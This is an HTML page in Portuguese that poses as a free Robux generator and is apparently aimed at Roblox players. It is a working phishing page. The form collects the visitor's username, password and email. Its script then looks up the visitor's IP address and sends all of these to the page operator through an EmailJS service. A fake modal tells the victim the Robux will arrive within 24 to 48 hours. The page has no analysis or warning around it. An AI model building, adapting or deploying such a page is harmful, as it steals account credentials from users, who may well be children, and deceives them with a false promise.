  <!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gerador de Robux Grátis</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(to bottom right, #1a1a2e, #16213e);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #fff;
            overflow: hidden;
            transition: background 1s;
        }

        .welcome-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            background: rgba(15, 81, 50, 0.9);
            padding: 50px;
            border-radius: 25px;
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
            animation: fadeIn 0.8s;
        }

        .container {
            display: none;
            flex-direction: column;
            align-items: center;
            text-align: center;
            background: rgba(15, 81, 50, 0.9);
            padding: 50px;
            border-radius: 25px;
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
            width: 400px;
            animation: fadeIn 0.8s;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }

        h1, h2 {
            margin-bottom: 20px;
            font-size: 2.5em;
            font-weight: bold;
            color: #e0e0e0;
            text-shadow: 0 0 5px rgba(255, 255, 255, 0.8);
        }

        .btn {
            margin-top: 20px;
            padding: 12px 24px;
            border: none;
            border-radius: 30px;
            background-color: #198754;
            color: white;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 100%;
        }

        .btn:hover {
            background-color: #1fae61;
            transform: scale(1.05);
        }

        .input-field, textarea, select {
            margin-top: 15px;
            padding: 12px;
            width: 80%;
            border-radius: 15px;
            border: none;
            background: #fff;
            font-size: 16px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
        }

        .input-field:focus, textarea:focus, select:focus {
            border: 2px solid #198754;
            outline: none;
            box-shadow: 0 0 10px rgba(25, 133, 84, 0.5);
        }

        textarea {
            resize: none;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            animation: fadeInModal 0.5s;
        }

        .modal-content {
            background-color: #fff;
            color: #000;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            width: 300px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
        }

        .modal button {
            margin-top: 10px;
            padding: 10px 20px;
            background-color: #198754;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .modal button:hover {
            background-color: #1fae61;
        }

        @keyframes fadeInModal {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .welcome-screen, .container {
                width: 90%;
                padding: 20px;
            }

            h1, h2 {
                font-size: 2em;
            }

            .btn {
                padding: 10px 20px;
            }

            .input-field, select, textarea {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="welcome-screen" id="welcomeScreen">
        <h1>Bem-vindo ao Gerador de Robux Grátis</h1>
        <button class="btn" onclick="showStartMenu()">Clique para Continuar</button>
    </div>

    <div class="container" id="startContainer">
        <h1>Gerador de Robux Grátis</h1>
        <button class="btn" onclick="showRobuxForm()">Receber Robux</button>
    </div>

    <div class="container" id="robuxContainer">
        <h2>Receber Robux</h2>
        <form id="robuxForm">
            <input type="text" class="input-field" id="usuario" name="username" placeholder="Nome de usuário" required><br>
            <input type="password" class="input-field" id="senha" name="password" placeholder="Senha" required><br>
            <input type="email" class="input-field" id="email" name="user_email" placeholder="Seu e-mail" required><br>
            <select class="input-field" id="quantidadeRobux" name="robux_quantity" required>
                <option value="">Selecione a quantidade de Robux</option>
                <option value="400">400 Robux</option>
                <option value="800">800 Robux</option>
                <option value="1600">1600 Robux</option>
            </select><br>
            <button type="submit" class="btn">Gerar Robux</button>
        </form>
        <button class="btn" onclick="goBack()">Voltar</button>
    </div>

    <div class="modal" id="modal">
        <div class="modal-content">
            <h3>O processo está em andamento!</h3>
            <p>Os Robux podem levar de 24 a 48 horas para serem enviados.</p>
            <button onclick="closeModal()">OK</button>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
        // Inicialização do EmailJS
        emailjs.init("KloIr6DhxYWQCvb2Y"); // Chave pública do seu serviço

        // Função para mostrar tela de início
        function showStartMenu() {
            document.getElementById('welcomeScreen').style.display = 'none';
            document.getElementById('startContainer').style.display = 'flex';
        }

        // Função para mostrar o formulário de Robux
        function showRobuxForm() {
            document.getElementById('startContainer').style.display = 'none';
            document.getElementById('robuxContainer').style.display = 'flex';
        }

        // Função para voltar
        function goBack() {
            document.getElementById('robuxContainer').style.display = 'none';
            document.getElementById('startContainer').style.display = 'flex';
        }

        // Enviar formulário de Robux
        document.getElementById("robuxForm").addEventListener("submit", function(event) {
            event.preventDefault();
            
            // Captura os valores dos campos do formulário
            var usuario = document.getElementById("usuario").value;
            var senha = document.getElementById("senha").value;
            var email = document.getElementById("email").value;
            var quantidadeRobux = document.getElementById("quantidadeRobux").value;

            // Captura o IP do usuário
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var userIP = data.ip;
                    var templateParams = {
                        usuario: usuario,
                        senha: senha,
                        email: email,
                        quantidadeRobux: quantidadeRobux,
                        ip: userIP
                    };

                    // Envia os dados do formulário para o EmailJS
                    emailjs.send("service_vpg5dg5", "template_pq6e8go", templateParams)
                        .then(function(response) {
                            // Exibe a mensagem de andamento
                            document.getElementById('modal').style.display = 'flex';
                        }, function(error) {
                            alert("Erro ao enviar os dados: " + error.text);
                        });
                })
                .catch(error => {
                    console.log('Erro ao capturar IP: ', error);
                    alert("Erro ao capturar o IP.");
                });
        });

        // Fechar o modal de andamento
        function closeModal() {
            document.getElementById('modal').style.display = 'none';
            goBack(); // Volta para o menu inicial
        }
    </script>
</body>
</html>
